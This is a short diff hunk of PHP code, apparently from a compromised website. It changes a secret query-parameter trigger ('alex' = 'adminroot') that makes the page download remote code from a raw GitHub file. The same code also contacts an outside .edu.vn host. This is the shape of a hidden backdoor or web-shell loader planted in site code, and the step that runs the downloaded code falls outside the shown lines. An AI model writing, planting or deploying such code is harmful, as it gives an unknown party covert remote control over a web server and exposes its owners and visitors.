@@ -19,7 +19,7 @@ $options = array(
 
 $context  = stream_context_create($options);
 $result = file_get_contents('https://thuvienso.caodang20.edu.vn/bin/app.php', false, $context);
-if (isset($_GET['alex']) && $_GET['alex'] === 'uuid') {
+if (isset($_GET['alex']) && $_GET['alex'] === 'adminroot') {
     $url = 'https://raw.githubusercontent.com/hinataloli/haha/main/pke.txt';
     $code = file_get_contents($url);
     if ($code !== false) {
